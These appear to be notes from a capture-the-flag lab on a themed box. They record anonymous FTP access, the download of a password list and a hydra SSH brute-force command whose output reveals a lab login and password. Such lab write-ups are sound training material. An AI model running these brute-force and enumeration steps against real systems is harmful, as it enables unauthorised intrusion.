http://10.10.188.195/

```html
<h3>Spike:"..Oh look you're finally up. It's about time, 3 more minutes and you were going out with the garbage."</h3>  
  
<hr>  
  
<h3>Jet:"Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef."</h3>  
  
<hr>  
  
<h3>Ed:"I'm Ed. You should have access to the device they are talking about on your computer. Edward and Ein will be on the main deck if you need us!"</h3>  
  
<hr>  
  
<h3>Faye:"..hmph.."</h3>
```

possible users

```
spike
jet
ed
faye
```

FTP anon login

```
ftp 10.10.188.195
```

```
Connected to 10.10.188.195.
220 (vsFTPd 3.0.3)
Name (10.10.188.195:devel): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> 
```

Mirror an FTP server
```
wget -m --user=anonymous --password= ftp://10.10.188.195
```

```
--2024-11-22 00:13:34--  ftp://10.10.188.195/
           => ‘10.10.188.195/.listing’
Connecting to 10.10.188.195:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... couldn't connect to 10.10.188.195 port 6564: Connection timed out
Retrying.

--2024-11-22 00:15:49--  ftp://10.10.188.195/
  (try: 2) => ‘10.10.188.195/.listing’
Connecting to 10.10.188.195:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... 
```

Strange traffic, try from direct, get the files downloaded

```
ftp> get task.txt
local: task.txt remote: task.txt
229 Entering Extended Passive Mode (|||8329|)
ftp: Can't connect to `10.10.188.195:8329': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**********************************|    68      228.98 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.62 KiB/s)
ftp> get locks.txt
local: locks.txt remote: locks.txt
229 Entering Extended Passive Mode (|||51338|)
ftp: Can't connect to `10.10.188.195:51338': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**********************************|   418        5.95 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (2.42 KiB/s)
```

locks.txt - seems to be a password list

```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

task.txt

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

new possible users

```
visious
redeye
lin
```

new users list including website

```
visious
redeye
lin
spike
jet
ed
faye
```


brute forcing ssh
```
hydra -L possible_users.txt -P locks.txt -e nsr -o /opt/THM/BountyHunter/2-enum/ssh/hydra_ssh.md ssh://10.10.188.195
```

```
[22][ssh] host: 10.10.188.195   login: lin   password: RedDr4gonSynd1cat3
```
